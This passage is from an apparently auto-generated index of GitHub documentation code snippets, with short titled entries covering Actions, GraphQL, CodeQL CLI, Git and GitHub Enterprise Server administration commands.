/path/to/github-backup-utils-vMAJOR.MINOR.PATCH.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Uninstalling Runner Service - Linux\nDESCRIPTION: Uninstalls the self-hosted runner service on Linux systems using `svc.sh`. Requires root privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nsudo ./svc.sh uninstall\n```\n\n----------------------------------------\n\nTITLE: JSON GraphQL Unexpected Error Response\nDESCRIPTION: Example of a GraphQL error response in JSON format when an unexpected error occurs, likely a GitHub bug.  The message instructs the user to include a reference code when reporting the issue. The response includes 'data' set to null and an 'errors' array containing the error message.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-explorer.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": null,\n  \"errors\": [\n    {\n      \"message\": \"Something went wrong while executing your query. This is most likely a GitHub bug. Please include \\\"7571:3FF6:552G94B:69F45B7:5913BBEQ\\\" when reporting this issue.\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_SOURCE_PROJECT_URL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_SOURCE_PROJECT_URL` to the GitHub Actions equivalent `${{ github.event.pull_request.head.repo.url }}`. URL of repo.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_69\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.head.repo.url }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Git to use S/MIME locally\nDESCRIPTION: Configures Git to use `smimesign` for S/MIME signing for a specific repository. This involves navigating to the repository directory and then setting the `gpg.x509.program` to `smimesign` and the `gpg.format` to `x509` using the `git config` command with the `--local` flag. This configuration applies only to the current repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd PATH-TO-REPOSITORY\ngit config --local gpg.x509.program smimesign\ngit config --local gpg.format x509\n```\n\n----------------------------------------\n\nTITLE: Dependencies in codeql-pack.lock.yml (YAML)\nDESCRIPTION: This snippet shows how dependencies are locked to specific versions in a `codeql-pack.lock.yml` file.  It includes both direct dependencies and transitive dependencies. The `version` field specifies the exact version number to be used.  `other-dependency/from-source` is excluded because it resolves from source and doesn't require a specific version.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_24\n\nLANGUAGE: YAML\nCODE:\n```\ndependencies:\n  codeql/cpp-all:\n    version: 0.1.4\n  my-user/my-lib:\n    version: 0.2.4\n  my-user/transitive-dependency:\n    version: 1.2.4\n```\n\n----------------------------------------\n\nTITLE: Regular Markdown table\nDESCRIPTION: This snippet shows a standard Markdown table without row headers. It includes column headers and data rows to display information in a tabular format.  This is provided for comparison to the table using the `rowheaders` tag.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/table-row-headers.md#_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n| Name | Seasons | Skill |\n|---|---|---|\n| Jill | 1 | Nunchucks |\n| Sabrina | 3 | Knives |\n| Kelly | 4 | Kicks |\n```\n\n----------------------------------------\n\nTITLE: Making the script executable (chmod +x)\nDESCRIPTION: Commands used to make the `entrypoint.sh` script executable and to check the permission.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit add entrypoint.sh\ngit update-index --chmod=+x entrypoint.sh\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngit ls-files --stage entrypoint.sh\n```\n\n----------------------------------------\n\nTITLE: Opening Codespace in VS Code using GitHub CLI\nDESCRIPTION: This command opens a specified codespace in Visual Studio Code. The `-c` flag specifies the codespace name. Requires VS Code to be installed locally.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/using-github-codespaces-with-github-cli.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace code -c CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Known Hosts Warning - Bash\nDESCRIPTION: This is an example of the warning message that may appear when connecting via SSH over port 443 for the first time.  It indicates that the host key is not found in the `known_hosts` file or is associated with another name. It prompts the user to verify the fingerprint.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/using-ssh-over-the-https-port.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n# The authenticity of host '[ssh.github.com]:443 ([140.82.112.36]:443)' can't be established.\n# ED25519 key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU.\n# This host key is known by the following other names/addresses:\n#     ~/.ssh/known_hosts:32: github.com\n# Are you sure you want to continue connecting (yes/no/[fingerprint])?\n```\n\n----------------------------------------\n\nTITLE: Finding Self-Hosted Runner Service Name - Shell\nDESCRIPTION: This shell command retrieves the name of the self-hosted runner service by reading the _.service_ file located in the runner's directory.  This command is intended to be run on Linux based runners running as a service.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ cat ~/actions-runner/.service\nactions.runner.octo-org-octo-repo.runner01.service\n```\n\n----------------------------------------\n\nTITLE: Defining Interface and Object in GraphQL Schema\nDESCRIPTION: This GraphQL snippet demonstrates how an object can implement an interface. Object `Y` implements interface `X`, meaning it must contain all the fields defined in `X`, while also being able to define additional fields specific to itself.  The `!` indicates that the field is required.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/introduction-to-graphql.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\ninterface X {\n  some_field: String!\n  other_field: String!\n}\n\ntype Y implements X {\n  some_field: String!\n  other_field: String!\n  new_field: String!\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Git with Homebrew on macOS\nDESCRIPTION: This snippet shows how to install Git on macOS using Homebrew, a popular package manager.  It assumes Homebrew is already installed. This is a prerequisite step for setting up Git Credential Manager (GCM) on macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/caching-your-github-credentials-in-git.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbrew install git\n```\n\n----------------------------------------\n\nTITLE: Specifying a Global Search Path for CodeQL Packs - Shell\nDESCRIPTION: This snippet demonstrates how to globally specify a directory for CodeQL to scan for CodeQL packs in a CodeQL configuration file. This is useful when the directory is not a sibling of the installation directory. The path provided will be added to the search path for CodeQL packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/specifying-command-options-in-a-codeql-configuration-file.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n--search-path <path-to-directory>\n```\n\n----------------------------------------\n\nTITLE: Applying Reusable Instructions - YAML\nDESCRIPTION: This example demonstrates how to apply reusable instructions from a YAML file to a query suite. It applies the instructions from `reusable-instructions.yml` to the queries in `queries/cpp/custom`, effectively filtering those queries based on the conditions defined in the reusable file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: queries/cpp/custom\n- apply: reusable-instructions.yml\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query for Direct Node Lookup with Inline Fragment\nDESCRIPTION: This GraphQL query performs a direct node lookup using the global node ID and an inline fragment.  It retrieves specific fields from the object based on its type. In this example, it retrieves the `name` and `login` fields for a `User` object. This demonstrates the standard way to access an object by its global node ID and fetch desired data.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-global-node-ids.md#_snippet_3\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  node(id:\"MDQ6VXNlcjU4MzIzMQ==\") {\n   ... on User {\n      name\n      login\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Connecting via SSH with Specific Private Key\nDESCRIPTION: This command connects to the administrative shell via SSH using a specified private key file and port 122. The `-i` flag specifies the path to the private key.  `HOSTNAME` should be replaced with the actual hostname or IP address of the GitHub Enterprise Server instance and `/path/to/ghe_private_key` should point to the correct key.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/accessing-the-administrative-shell-ssh.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh -i /path/to/ghe_private_key -p 122 admin@HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Fetching GitHub Repositories in JavaScript\nDESCRIPTION: This JavaScript function `listRepos` fetches a list of repositories for a given organization from the GitHub API. It takes the organization name (`o`) and the number of repositories per page (`p`) as input. It returns a promise that resolves to the JSON data containing the list of repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction listRepos(o, p) {\n return fetch(`https://api.github.com/orgs/${o}/repos?per_page=${parseInt(p)}`)\n   .then((response) => response.json())\n   .then( (data) => data);\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit without Authentication in Ruby\nDESCRIPTION: This snippet demonstrates creating an Octokit client without any authentication, resulting in a lower rate limit.  It requires the `octokit` gem.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\noctokit = Octokit::Client.new\n```\n\n----------------------------------------\n\nTITLE: Setting Extractor Options via CLI\nDESCRIPTION: This demonstrates how to set extractor options using the `--extractor-option` flag in the CodeQL CLI.  It showcases setting options for specific extractors (e.g., java) and also setting options without specifying the extractor name, which applies to all extractors with the same option name.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/extractor-options.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n* `codeql database create --extractor-option java.option1=abc ...`\n* `codeql database start-tracing --extractor-option java.group1.option2=102 ...`\n```\n\nLANGUAGE: bash\nCODE:\n```\n* `codeql database create --extractor-option option1=abc ...`\n* `codeql database start-tracing --extractor-option group1.option2=102 ...`\n```\n\n----------------------------------------\n\nTITLE: Listing CodeQL Packages\nDESCRIPTION: This command lists the CodeQL packages rooted at the specified directory. The directory should contain a qlpack.yml or .codeqlmanifest.json file to be considered a valid CodeQL package root. The output displays information about the found packages based on the specified format.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-ls.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack ls <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Cluster Support Bundle (ghe-cluster-support-bundle)\nDESCRIPTION: This utility creates a support bundle tarball containing important logs from each of the nodes in either a Geo-replication or Clustering configuration.  Options exist for standard bundles, extended bundles, bundles with data from the last X days and uploading to {% data variables.contact.github_support %}.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_38\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-cluster-support-bundle -o' > cluster-support-bundle.tgz\n```\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- \"ghe-cluster-support-bundle -p 2days -o\" > support-bundle.tgz\n```\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- ghe-cluster-support-bundle -x -o' > cluster-support-bundle.tgz\n```\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-cluster-support-bundle -u'\n```\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-cluster-support-bundle -t TICKET_ID'\n```\n\n----------------------------------------\n\nTITLE: Limiting Workflow Run Based on Branch\nDESCRIPTION: This YAML configuration demonstrates filtering workflow runs based on the triggering workflow's branch. The workflow will only execute if the 'Build' workflow runs on the `canary` branch.  The `branches` filter within the `workflow_run` event restricts execution to specific branches.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_58\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_run:\n    workflows: [Build]\n    types: [requested]\n    branches: [canary]\n```\n\n----------------------------------------\n\nTITLE: Updating SSL Certificate (ghe-ssl-certificate-setup)\nDESCRIPTION: This utility updates the SSL certificate for GitHub Enterprise Server. Use the `-h` flag for more information and additional options.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_28\n\nLANGUAGE: Shell\nCODE:\n```\n/usr/local/share/enterprise/ghe-ssl-certificate-setup\n```\n\n----------------------------------------\n\nTITLE: Accessing Replication Overview Dashboard\nDESCRIPTION: This snippet shows the URL structure for accessing the replication overview dashboard on your instance. Replace `HOSTNAME` with your instance's actual hostname to view the dashboard in a web browser.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/monitoring-a-high-availability-configuration.md#_snippet_1\n\nLANGUAGE: URL\nCODE:\n```\nhttp(s)://HOSTNAME/setup/replication\n```\n\n----------------------------------------\n\nTITLE: Yarn Classic .yarnrc Configuration\nDESCRIPTION: This snippet shows a `.yarnrc` file configuration for Yarn Classic, specifying the private registry URL. This ensures that Yarn Classic resolves dependencies from the specified private registry.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n registry https://private_registry_url\n```\n\n----------------------------------------\n\nTITLE: Generating Query Help with CodeQL CLI\nDESCRIPTION: This command generates query help in a specified format using the CodeQL CLI.  It takes a path to a .qhelp file, a .ql file, a directory, or a query suite as input. The `--format` option specifies the output format (e.g., markdown), and the `--output` option specifies the output file or directory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-query-help-files.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql generate query-help <qhelp|query|dir|suite> --format=<format> [--output=<dir|file>]\n```\n\n----------------------------------------\n\nTITLE: S3 Bucket Write Access IAM Policy - JSON\nDESCRIPTION: This JSON defines an IAM policy that allows writing objects to an S3 bucket.  The `Resource` field should be updated to reflect the ARN of the target bucket. The policy grants the `s3:PutObject` permission.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/audit_log/create-s3-policy.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"Version\": \"2012-10-17\",\n   \"Statement\": [\n      {\n         \"Sid\": \"VisualEditor0\",\n         \"Effect\": \"Allow\",\n         \"Action\": [\n            \"s3:PutObject\"\n         ],\n         \"Resource\": \"arn:aws:s3:::EXAMPLE-BUCKET/*\"\n     }\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Tearing down replication state using ghe-repl-teardown (Shell)\nDESCRIPTION: This shell command tears down the replication state on a GitHub Enterprise Server replica, permanently removing it from the high availability setup. It requires administrative access to the replica server and should be executed after `ghe-repl-stop`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/removing-a-high-availability-replica.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-teardown\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting AskPass Response - Shell\nDESCRIPTION: This snippet shows the error when GitHub Desktop is unable to read the askpass response, which can be caused by modified registry entries or extended Unicode characters in the Windows username. Solutions include checking and deleting Autorun registry values and creating a new Windows user account.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nerror: unable to read askpass response from '/Users/<path>/GitHub Desktop.app/Contents/Resources/app/static/ask-pass-trampoline.sh'\nfatal: could not read Username for 'https://github.com': terminal prompts disabled\n```\n\n----------------------------------------\n\nTITLE: Adding a feature to devcontainer.json for Java in Codespaces\nDESCRIPTION: This snippet shows how to add a comma after the `features` property in `devcontainer.json`. This is a prerequisite to adding more properties to the `devcontainer.json` file.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-java-project-for-codespaces.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n   \"features\": {\n     \"ghcr.io/devcontainers/features/java:1\": {\n       \"version\": \"none\",\n       \"installMaven\": \"true\",\n       \"installGradle\": \"false\"\n     },\n     \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n   },\n```\n\n----------------------------------------\n\nTITLE: Escaping pipe characters in table cells\nDESCRIPTION: This snippet demonstrates how to include a pipe `|` character within a table cell by escaping it with a backslash `\\`. This prevents the pipe from being interpreted as a column separator.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-tables.md#_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n| Name     | Character |\n| ---      | ---       |\n| Backtick | `         |\n| Pipe     | \\|        |\n```\n\n----------------------------------------\n\nTITLE: Configuring publishConfig in package.json (Shell, GHES - subdomain isolation disabled)\nDESCRIPTION: This snippet shows the `publishConfig` setting in `package.json` specifically when subdomain isolation is disabled on a GitHub Enterprise Server instance. The `registry` key specifies the URL to the npm registry endpoint on the GHES instance. This ensures packages are published to the correct registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n\"publishConfig\": {\n  \"registry\": \"https://HOSTNAME/_registry/npm/\"\n},\n```\n\n----------------------------------------\n\nTITLE: Combining Standard and Feature Versioning in Frontmatter\nDESCRIPTION: This YAML snippet illustrates how to combine both standard versioning (e.g., fpt) and feature-based versioning in the frontmatter. The article will be included in the superset of all versions specified, ensuring that the content is visible across the intended products or plans.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  feature: 'some-new-feature'\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Variable: Jenkins Pipeline (YAML)\nDESCRIPTION: Defines an environment variable `MAVEN_PATH` within a Jenkins pipeline. This variable is accessible within the pipeline's execution environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\npipeline {\n  agent any\n  environment {\n    MAVEN_PATH = '/usr/local/maven'\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Git Repository\nDESCRIPTION: This snippet initializes a local directory as a Git repository. It uses the `git init -b main` command to create a new repository with the default branch named `main`. This command is compatible with Git version 2.28.0 or later.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit init -b main\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering based on GHES version and FPT absence using Liquid\nDESCRIPTION: This snippet demonstrates how to conditionally display the text \"Alpha\" if the product is not FPT and the GitHub Enterprise Server version is exactly 2.13. The `ifversion not fpt and ghes = 2.13` tag checks both conditions and renders the content only if both are true.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/equals.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes = 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Checking Git Remote URL - Shell\nDESCRIPTION: This code snippet shows an example of a `.git/config` file, specifically the `remote \"origin\"` section. The `url` parameter specifies the remote repository URL.  It's crucial that this URL uses the SSH protocol (e.g., `git@github.com:YOUR_ACCOUNT/YOUR_PROJECT.git`) for agent forwarding to work.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n[remote \"origin\"]\n  url = git@{% ifversion ghes %}hostname{% else %}github.com{% endif %}:YOUR_ACCOUNT/YOUR_PROJECT.git\n  fetch = +refs/heads/*:refs/remotes/origin/*\n```\n\n----------------------------------------\n\nTITLE: Publishing a NuGet Package to GitHub Packages\nDESCRIPTION: This command publishes a NuGet package to GitHub Packages using the `dotnet nuget push` command. Replace `PROJECT_NAME` and `1.0.0` with the actual project name and version number. The `--source \"github\"` option specifies that the package should be pushed to the GitHub Packages feed configured with the name \"github\" in the NuGet configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\ndotnet nuget push \"bin/Release/PROJECT_NAME.1.0.0.nupkg\" --source \"github\"\n```\n\n----------------------------------------\n\nTITLE: Pushing Individual Commits to Remote Git Repository\nDESCRIPTION: This command pushes a specific commit to a remote branch. `REMOTE-NAME` is the name of the remote repository, `YOUR_COMMIT_SHA_NUMBER` is the SHA of the commit you want to push, and `BRANCH-NAME` is the name of the branch to push to. The `+` before the commit SHA forces the push even if it's not a fast-forward.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/troubleshooting-the-2-gb-push-limit.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME +<YOUR_COMMIT_SHA_NUMBER>:refs/heads/BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Generating FizzBuzz function with GitHub Copilot in JavaScript\nDESCRIPTION: This snippet demonstrates how to use GitHub Copilot to generate a basic `fizzBuzz` function in JavaScript. By typing the function signature `function fizzBuzz()` followed by a space, Copilot should suggest a common implementation of the fizz buzz algorithm. The generated code should then be checked against the log for similar code entries.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/code-referencing-verifying.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction fizzBuzz()\n```\n\n----------------------------------------\n\nTITLE: Creating a data disk on GCP using gcloud\nDESCRIPTION: This command creates a data disk on Google Cloud Platform using the gcloud compute command-line tool.  The disk is used as an attached storage volume for your instance data. Replace `DATA-DISK-NAME`, `DATA-DISK-SIZE`, `DATA-DISK-TYPE`, and `ZONE` with your desired values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-google-cloud-platform.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud compute disks create DATA-DISK-NAME --size DATA-DISK-SIZE --type DATA-DISK-TYPE --zone ZONE\n```\n\n----------------------------------------\n\nTITLE: Verifying Private Key Fingerprint using OpenSSL\nDESCRIPTION: This command generates the SHA-256 fingerprint of a private key (PEM file) using OpenSSL. It converts the private key to a public key, calculates the SHA-256 hash, and encodes the hash in Base64. The resulting fingerprint can be compared to the fingerprint displayed in the GitHub App settings to verify the key's integrity.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/managing-private-keys-for-github-apps.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nopenssl rsa -in PATH_TO_PEM_FILE -pubout -outform DER | openssl sha256 -binary | openssl base64\n```\n\n----------------------------------------\n\nTITLE: Filtering Pull Requests by Branch - YAML\nDESCRIPTION: This workflow configuration defines branch filters for `pull_request` events. It includes pull requests targeting branches that match `releases/**` but excludes those that also match `!releases/**-alpha`. The order of patterns is crucial; the positive pattern must come before the negative pattern to achieve the desired filtering.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-workflow-branches4.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n----------------------------------------\n\nTITLE: Downloading ADO2GH Migration Log with GitHub CLI\nDESCRIPTION: Downloads the latest migration log for an individual repository when the migration source is Azure DevOps, using the `gh ado2gh download-logs` command.  Requires the DESTINATION organization, REPOSITORY name, and a FILENAME for the log file. A {% data variables.product.pat_generic %} with appropriate scopes is needed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/accessing-your-migration-logs-for-github-enterprise-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh download-logs --github-target-org DESTINATION --target-repo REPOSITORY --migration-log-file FILENAME\n```\n\n----------------------------------------\n\nTITLE: Clearing Git Credential Manager Credentials\nDESCRIPTION: This command clears stored credentials for GitHub using Git Credential Manager. It's required when switching between multiple HTTPS-authenticated accounts to ensure the correct credentials are used for each repository. The `echo` command pipes the protocol and host information to `git credential-manager erase`.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-your-personal-account/managing-multiple-accounts.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\necho \"protocol=https\\nhost=github.com\" | git credential-manager erase\n```\n\n----------------------------------------\n\nTITLE: Pulling Docker Image from GitHub Packages (FPT/GHEC)\nDESCRIPTION: This snippet demonstrates how to pull a Docker image from GitHub Packages using the `docker pull` command for GitHub Free, Pro, Team, and GitHub Enterprise Cloud. It requires Docker to be installed and configured. Replace OWNER, REPOSITORY, IMAGE_NAME, and TAG_NAME with the appropriate values for your image.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ndocker pull docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:TAG_NAME\n```\n\n----------------------------------------\n\nTITLE: Ignoring Pull Request Paths in YAML\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to ignore specific file paths in pull requests, preventing code scans from being triggered when only those files are changed. The `paths-ignore` array specifies the file patterns to ignore.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  push:\n    branches: [main, protected]\n  pull_request:\n    branches: [main]\n    paths-ignore:\n      - '**/*.md'\n      - '**/*.txt'\n```\n\n----------------------------------------\n\nTITLE: Defining RAM and Threads for CodeQL Commands - Shell\nDESCRIPTION: This snippet shows how to define the RAM (4096 MB) and the number of threads (4) to use when running CodeQL commands in a CodeQL configuration file. These settings apply globally to all relevant CodeQL commands. Place each option on a separate line in the user's CodeQL configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/specifying-command-options-in-a-codeql-configuration-file.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n--ram 4096\n--threads 4\n```\n\n----------------------------------------\n\nTITLE: Creating an Asynchronous Linter Rule Template\nDESCRIPTION: This template demonstrates how to create an asynchronous linter rule.  It includes the `asynchronous: true` property in the exported rule object. This property is crucial for rules that perform asynchronous operations. The rest of the rule structure mirrors the synchronous rule template.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/README.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { addError } from 'markdownlint-rule-helpers'\n\nexport const myRule = {\n  names: [],\n  description: '',\n  tags: [],\n  parser: 'markdownit',\n  asynchronous: true\n  function: (params, onError) => {\n    // Logic to check for violations of the rule\n\n    // If a violation is found, call addError\n    addError(\n      ... // error parameters\n    )\n  },\n}\n```\n\n----------------------------------------\n\nTITLE: Example `steps` Context - JSON\nDESCRIPTION: This JSON snippet shows an example of the `steps` context, containing information about two previous steps, `checkout` and `generate_number`. It includes their outputs, outcome, and conclusion. The `generate_number` step defines an output called `random_number`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"checkout\": {\n    \"outputs\": {},\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  },\n  \"generate_number\": {\n    \"outputs\": {\n      \"random_number\": \"1\"\n    },\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Error Message: Code Security Not Enabled\nDESCRIPTION: This error message indicates that {% data variables.product.prodname_GHAS_or_code_security %} is not enabled for the repository, preventing code scanning from running. It includes a 403 error code specifying that the feature is disabled. The error may also indicate that a policy is blocking the use of the feature.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/advanced-security-must-be-enabled.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n{% data variables.product.prodname_GHAS_or_code_security %} must be enabled for this repository to use code scanning\n403: {% data variables.product.prodname_GHAS_or_code_security %} is 